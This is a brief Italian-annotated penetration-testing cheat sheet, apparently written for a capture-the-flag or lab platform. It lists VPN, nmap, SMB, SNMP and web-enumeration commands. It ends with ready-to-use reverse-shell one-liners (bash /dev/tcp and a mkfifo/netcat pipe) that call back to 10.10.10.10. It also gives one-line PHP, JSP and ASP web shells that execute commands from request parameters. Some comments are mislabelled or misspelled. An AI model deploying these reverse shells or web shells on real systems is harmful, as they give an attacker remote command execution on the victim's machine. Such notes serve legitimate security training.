#VPN Connect
sudo openvpn name.ovpn

#Comandi Network

ifconfig

netstat -rn  //ci mostrerà le reti accessibili tramite la VP
netcat 10.10.10.10 22   //Ascoltare sulla porta
nc -lvnp 1234   //listening port

ssh User@10.10.10.10  //SSH Connection

nmap 10.10.10.10  //scansione semplice
nmap -sV -sC -p- 10.10.10.10   //scansione approfondita
nmap -sC -sV -p22 10.10.10.10   //ftp attack
nmap -v -oG -
ftp -p 10.10.10.10    //connessione ftp


nmap --script smb-os-discovery.nse -p445 10.10.10.10    //Esempio lancio script con nmap
smbclient -N -L \\\\10.10.10.10          //script windows nmap
smbclient -U user \\\\10.10.10.10\\users

nc -nv 10.10.10.10 22  //Attaccare i servizi di rete

snmpwalk -v 2c -c public 10.10.10.10 1.3.6.1.2.1.1.5.0   //Le stringhe della comunità SNMP forniscono informazioni e statistiche su un router o dispositivo.
snmpwalk -v 2c -c private  10.10.10.10

//Scansioni Web
curl -IL link.com
whatweb 10.10.10.10
atweb --no-errors 10.10.10.0/24

gobuster dir -u http://10.10.10.10/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.tx  //accessible directory


//shell inversa (bash)
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f

/tty
python -c 'import pty; pty.spawn("/bin/bash")'
which python3

//web shell php
<?php system($_REQUEST["cmd"]); ?>

//web shell js
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

//webshell asp
<% eval request("cmd") %>
